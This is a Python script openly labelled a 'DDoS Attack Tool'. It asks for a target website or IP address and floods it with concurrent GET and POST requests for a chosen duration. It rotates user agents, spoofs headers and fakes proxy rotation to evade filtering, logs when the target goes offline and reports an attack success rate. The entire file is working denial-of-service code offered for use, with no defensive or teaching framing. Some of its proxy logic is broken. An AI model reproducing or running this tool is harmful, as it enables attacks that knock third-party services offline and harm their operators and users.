import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import List, Dict, Optional
from fake_useragent import UserAgent
import time
import ctypes
import logging
import random
import string

# Set up logging configuration
log_file = "ddos_attack.log"
logging.basicConfig(filename=log_file, level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def set_console_title(title: str):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def print_intro():
    logo = """
    ____  ____             __              __
   / __ \/ __ \____  _____/ /_____  ____  / /
  / / / / / / / __ \/ ___/ __/ __ \/ __ \/ / 
 / /_/ / /_/ / /_/ (__  ) /_/ /_/ / /_/ / /  
/_____/_____/\____/____/\__/\____/\____/_/
github.com/wiced1
"""
    print(logo)

def generate_random_string(length: int) -> str:
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def send_request(session: requests.Session, url: str, proxies: Optional[Dict[str, str]] = None) -> bool:
    try:
        response = session.get(url, timeout=5, proxies=proxies)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def analyze_responses(responses: List[requests.Response]):
    status_codes = [response.status_code for response in responses]
    unique_status_codes = set(status_codes)
    status_code_counts = {code: status_codes.count(code) for code in unique_status_codes}

    print("--- Response Analysis ---")
    for code, count in status_code_counts.items():
        print(f"Status Code {code}: {count} occurrence(s)")

def convert_to_seconds(hours: int, minutes: int, seconds: int) -> int:
    return hours * 3600 + minutes * 60 + seconds

def send_requests_with_duration(url: str, num_requests: int, duration_hours: int, duration_minutes: int, duration_seconds: int, proxies: Optional[Dict[str, str]] = None, max_concurrency: int = 100) -> List[bool]:
    domain = urlparse(url).hostname
    results = []
    responses = []
    ua = UserAgent()
    
    with requests.Session() as session:
        downtime_start = None
        downtime_end = None
        duration_seconds_total = convert_to_seconds(duration_hours, duration_minutes, duration_seconds)
        start_time = time.time()
        
        while time.time() - start_time < duration_seconds_total:
            with ThreadPoolExecutor(max_workers=min(num_requests, max_concurrency)) as executor:
                futures = [executor.submit(send_request, session, url, proxies=proxies) for _ in range(num_requests)]
                
                for future in as_completed(futures):
                    result = future.result()
                    response = session.get(url, proxies=proxies)
                    results.append(result)
                    responses.append(response)

                    if not result:
                        if downtime_start is None:
                            downtime_start = time.time()
                    else:
                        if downtime_start is not None:
                            downtime_end = time.time()
                            downtime_duration = downtime_end - downtime_start

                            # Log downtime information
                            log_data = {
                                "identifier": generate_random_string(8),
                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                                "url": url,
                                "status": "offline",
                                "downtime_duration": downtime_duration
                            }
                            logging.warning(f"{log_data}")

                            downtime_start = None

                    # Rotate user-agent and proxy for the next request
                    session.headers['User-Agent'] = ua.random
                    if proxies:
                        proxies = {
                            'http': f'http://{generate_random_string(16)}.com',
                            'https': f'https://{generate_random_string(16)}.com'
                        }
                        session.proxies = proxies

                    # Spoof various headers
                    session.headers['Accept-Language'] = generate_random_string(5)

                    # Introduce variability in request payload
                    payload = generate_random_string(10)
                    session.post(url, data={'payload': payload}, proxies=proxies)

                    # Manage sessions, handle cookies, and maintain session persistence
                    session.cookies.update(response.cookies)

                    # Simulate intelligent rate limiting
                    time.sleep(random.uniform(0.5, 2.0))

        for i, result in enumerate(results):
            status_msg = "Website is down" if not result else ""
            print(f"Request {i + 1} sent with result: {result} ({status_msg})")

    analyze_responses(responses)
    return results

def main():
    set_console_title("DDoS Attack Tool")
    print_intro()

    target_type = input("Do you want to target a website or an IP address? (website/ip): ")
    
    if target_type.lower() == "website":
        url = input("Enter the target URL to attack: ")
    elif target_type.lower() == "ip":
        ip = input("Enter the target IP address to attack: ")
        url = f"http://{ip}"
    else:
        print("Invalid target type. Please run the program again.")
        return

    try:
        num_requests = int(input("Enter the number of requests to send: "))
        duration_hours = int(input("Enter the duration in hours: "))
        duration_minutes = int(input("Enter the duration in minutes: "))
        duration_seconds = int(input("Enter the duration in seconds: "))
    except ValueError:
        print("Invalid input. Please enter integer values for the number of requests and duration.")
        return

    use_proxy = input("Do you want to use proxies? (y/n): ")
    
    if use_proxy.lower() == "y":
        proxy_type = input("Enter the proxy type (http/https): ")
        proxy_host = input("Enter the proxy host: ")
        proxy_port = input("Enter the proxy port: ")
        proxies = {proxy_type: f"{proxy_type}://{proxy_host}:{proxy_port}"}
    else:
        proxies = None

    print("\n--- Initiating Attack ---")
    results = send_requests_with_duration(url, num_requests, duration_hours, duration_minutes, duration_seconds, proxies=proxies, max_concurrency=100)
    successes = results.count(True)
    success_rate = successes / num_requests

    print("\n--- Attack Complete ---")
    print(f"Attack Success Rate: {success_rate:.2%}")

if __name__ == "__main__":
    main()
